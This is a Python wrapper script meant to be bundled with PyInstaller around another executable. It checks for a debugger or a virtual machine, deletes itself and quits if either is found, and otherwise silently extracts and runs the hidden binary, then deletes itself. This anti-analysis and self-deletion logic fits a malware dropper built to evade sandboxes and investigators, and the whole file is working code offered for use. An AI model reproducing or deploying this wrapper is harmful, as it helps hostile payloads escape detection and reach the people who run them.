# pyinstaller --onefile --add-data "calc.exe:." wrapper.py

import os
import sys
import platform
import ctypes
import subprocess
import tempfile
import shutil

def is_debugger_present():
    if platform.system() == 'Windows':
        is_debugger = ctypes.windll.kernel32.IsDebuggerPresent()
        return bool(is_debugger)
    else:
        try:
            with open("/proc/self/status", "r") as status_file:
                for line in status_file:
                    if "TracerPid" in line:
                        if int(line.split(":")[1].strip()) > 0:
                            return True
        except Exception:
            return False
    return False

def is_virtual_machine():
    if platform.system() == 'Windows':
        vm_artifacts = ["vbox", "vmware", "qemu", "virtual"]
        for artifact in vm_artifacts:
            if artifact in os.popen("SYSTEMINFO").read().lower():
                return True
    else:
        try:
            with open("/proc/cpuinfo", "r") as cpuinfo:
                for line in cpuinfo:
                    if "hypervisor" in line or "vmware" in line or "virtualbox" in line:
                        return True
        except Exception:
            return False
    return False

def delete_self():
    try:
        if platform.system() == 'Windows':
            file_path = os.path.abspath(__file__)
            delete_command = f"del /F /Q {file_path}"
            subprocess.Popen(delete_command, shell=True)
        else:
            file_path = os.path.abspath(__file__)
            os.remove(file_path)
    except Exception as e:
        pass

def extract_and_execute():
    temp_dir = tempfile.mkdtemp()
    embedded_executable = os.path.join(temp_dir, "original_executable")

    with open(embedded_executable, "wb") as f:
        f.write(get_embedded_executable())

    os.chmod(embedded_executable, 0o755)

    if platform.system() == 'Windows':
        subprocess.run(embedded_executable)
    else:
        subprocess.run([embedded_executable])

    shutil.rmtree(temp_dir)

def get_embedded_executable():
    import pkgutil
    return pkgutil.get_data(__name__, sys.argv[1])

def main():
    if is_debugger_present() or is_virtual_machine():
        delete_self()
        sys.exit()

    extract_and_execute()
    delete_self()

if __name__ == "__main__":
    main()
